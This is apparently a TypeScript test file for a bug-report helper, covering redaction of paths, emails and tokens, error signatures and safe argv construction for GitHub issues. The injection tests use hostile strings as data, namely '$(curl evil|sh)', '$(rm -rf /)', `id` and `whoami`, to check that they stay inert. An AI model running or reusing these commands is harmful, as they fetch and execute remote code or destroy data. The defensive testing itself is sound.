import { describe, it, expect } from 'vitest';
import * as os from 'os';
import {
  sanitize,
  errorSignature,
  looksEnvironmental,
  buildIssueTitle,
  buildIssueBody,
  buildIssueCreateArgs,
  buildIssueListArgs,
  gatherEnv,
  type CapturedError,
} from './bug-report';

describe('sanitize', () => {
  it('replaces the home directory with ~', () => {
    const home = os.homedir();
    const input = `Error at ${home}/Work/repo/file.ts`;
    expect(sanitize(input)).toBe('Error at ~/Work/repo/file.ts');
  });

  it('redacts /Users/<name>/ paths for other users', () => {
    const out = sanitize('bash: /Users/shay.tidhar@acme.com/.volta/tmp/x.sh: not found');
    expect(out).not.toContain('shay.tidhar');
    expect(out).toContain('/Users/<user>');
  });

  it('redacts email addresses', () => {
    expect(sanitize('contact john.doe@example.com now')).toBe('contact <email> now');
  });

  it('redacts GitHub tokens', () => {
    expect(sanitize('token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345')).toContain('<redacted>');
    expect(sanitize('token ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345')).not.toContain('ghp_ABCDEF');
  });

  it('redacts long mixed token-like strings', () => {
    const out = sanitize('key=aB3dE5fG7hJ9kL1mN3pQ5rS7tU9vW1xY3z');
    expect(out).toContain('<redacted>');
  });

  it('leaves normal text untouched', () => {
    expect(sanitize('Repositories not found: partnerships-api')).toBe('Repositories not found: partnerships-api');
  });
});

describe('errorSignature', () => {
  it('is stable across varying line numbers and counts', () => {
    const a = errorSignature('Failed at line 42, 3 repos', 'at foo (/x/y.ts:10:5)');
    const b = errorSignature('Failed at line 99, 7 repos', 'at foo (/x/y.ts:88:2)');
    expect(a).toBe(b);
  });

  it('differs for genuinely different errors', () => {
    const a = errorSignature('Could not clone repo', undefined);
    const b = errorSignature('Permission denied', undefined);
    expect(a).not.toBe(b);
  });

  it('is a short hex string', () => {
    expect(errorSignature('x', undefined)).toMatch(/^[0-9a-f]{12}$/);
  });

  it('ignores user-specific paths in the signature (sanitized first)', () => {
    const home = os.homedir();
    const a = errorSignature(`boom ${home}/a`, undefined);
    const b = errorSignature('boom ~/a', undefined);
    expect(a).toBe(b);
  });
});

describe('looksEnvironmental', () => {
  it('flags network/auth/credential errors', () => {
    for (const m of [
      'spawnSync pi ETIMEDOUT',
      'getaddrinfo ENOTFOUND github.com',
      'gh auth: not authenticated',
      'AWS SSO token expired',
      'bash: claude: command not found',
      'No such file or directory',
    ]) {
      expect(looksEnvironmental(m)).toBe(true);
    }
  });

  it('does NOT flag genuine code errors', () => {
    for (const m of [
      'Cannot read properties of undefined (reading foo)',
      'TypeError: x is not a function',
      'Repositories not found: partnerships-api',
    ]) {
      expect(looksEnvironmental(m)).toBe(false);
    }
  });
});

describe('buildIssueTitle / buildIssueBody', () => {
  const err: CapturedError = {
    command: `w update --workspace ${os.homedir()}/x`,
    message: 'TypeError: cannot read foo of undefined',
    stack: `TypeError: cannot read foo\n  at run (${os.homedir()}/.local/pi/x.ts:10:3)`,
    timestamp: '2026-01-01T00:00:00.000Z',
    version: '4.14.5',
  };

  it('title includes a signature and is prefixed [auto]', () => {
    const title = buildIssueTitle(err);
    expect(title).toMatch(/^\[auto\] /);
    expect(title).toMatch(/\([0-9a-f]{12}\)$/);
  });

  it('body is fully sanitized (no home dir leak)', () => {
    const body = buildIssueBody(err, gatherEnv('4.14.5'));
    expect(body).not.toContain(os.homedir());
    expect(body).toContain('~/');
    expect(body).toContain('Signature:');
    expect(body).toContain('4.14.5');
    expect(body).toContain('### Stack');
  });
});

describe('command-injection safety (argv, no shell)', () => {
  it('passes a malicious title/body as inert single argv elements', () => {
    const title = 'boom $(touch /tmp/pwned) `id`';
    const body = 'stack with ${HOME} and $(curl evil|sh) and `whoami`';
    const args = buildIssueCreateArgs(title, body);

    // title and body must each be exactly ONE argv element, verbatim —
    // never split or interpolated. execFileSync passes argv without a shell.
    const ti = args.indexOf('--title');
    const bi = args.indexOf('--body');
    expect(ti).toBeGreaterThanOrEqual(0);
    expect(bi).toBeGreaterThanOrEqual(0);
    expect(args[ti + 1]).toBe(title);
    expect(args[bi + 1]).toBe(body);

    // No argv element is a shell invocation.
    expect(args).not.toContain('-c');
    expect(args.some((a) => a === 'sh' || a === 'bash' || a === '/bin/sh')).toBe(false);
  });

  it('issue-list argv contains no free-text search of untrusted input', () => {
    const args = buildIssueListArgs();
    // Dedup is client-side now; we must not pass --search with attacker text.
    expect(args).not.toContain('--search');
    expect(args).toContain('--label');
    expect(args).toContain('--json');
  });
});

describe('sanitize — shell metacharacter neutralization (defense in depth)', () => {
  it('neutralizes command substitution and backticks', () => {
    const out = sanitize('run $(rm -rf /) and `id` and ${PATH}');
    expect(out).not.toMatch(/\$\(/);   // $( broken up
    expect(out).not.toContain('`');     // backtick replaced
    expect(out).not.toMatch(/\$\{/);    // ${ broken up
  });
});

describe('sanitize / errorSignature — defensive against bad input', () => {
  it('sanitize tolerates non-string input', () => {
    // @ts-expect-error intentional bad input
    expect(sanitize(undefined)).toBe('');
    // @ts-expect-error intentional bad input
    expect(sanitize(null)).toBe('');
  });

  it('errorSignature tolerates empty/missing message', () => {
    expect(() => errorSignature('', undefined)).not.toThrow();
    // @ts-expect-error intentional bad input
    expect(() => errorSignature(undefined, undefined)).not.toThrow();
    expect(errorSignature('', undefined)).toMatch(/^[0-9a-f]{12}$/);
  });
});
